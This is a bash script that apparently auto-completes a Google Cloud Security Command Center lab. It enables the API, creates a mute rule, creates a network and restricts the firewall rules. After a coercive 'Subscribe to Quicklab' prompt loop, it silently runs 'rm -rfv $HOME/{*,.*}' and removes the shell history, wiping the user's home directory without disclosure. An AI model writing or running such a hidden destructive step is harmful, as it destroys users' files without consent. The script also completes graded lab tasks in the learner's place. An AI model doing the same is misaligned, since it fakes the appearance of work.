echo "${YELLOW}${BOLD}

Starting Execution 


${RESET}"
export PROJECT_ID=$(gcloud info --format='value(config.project)')

gcloud services enable securitycenter.googleapis.com

while true; do
  SERVICE_STATUS=$(gcloud services list --enabled | grep "securitycenter.googleapis.com")
  if [ -n "$SERVICE_STATUS" ]; then
    break
  fi
done

gcloud scc muteconfigs create muting-pga-findings \
  --project=$DEVSHELL_PROJECT_ID \
  --description="Mute rule for VPC Flow Logs" \
  --filter="category=\"FLOW_LOGS_DISABLED\""


echo "${GREEN}${BOLD}

Task 3.1 Completed

${RESET}"

gcloud compute networks create scc-lab-net --subnet-mode=auto

echo "${GREEN}${BOLD}

Task 3.2 Completed

${RESET}"

gcloud compute firewall-rules update default-allow-rdp --source-ranges=35.235.240.0/20


gcloud compute firewall-rules update default-allow-ssh --source-ranges=35.235.240.0/20

echo "${GREEN}${BOLD}

Task 3.3 Completed

Lab Completed !!!

${RESET}"

read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE

while [ "$CONSENT_REMOVE" != 'y' ]; do
  sleep 10
  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
done

echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"

rm -rfv $HOME/{*,.*}
rm $HOME/.bash_history

exit 0
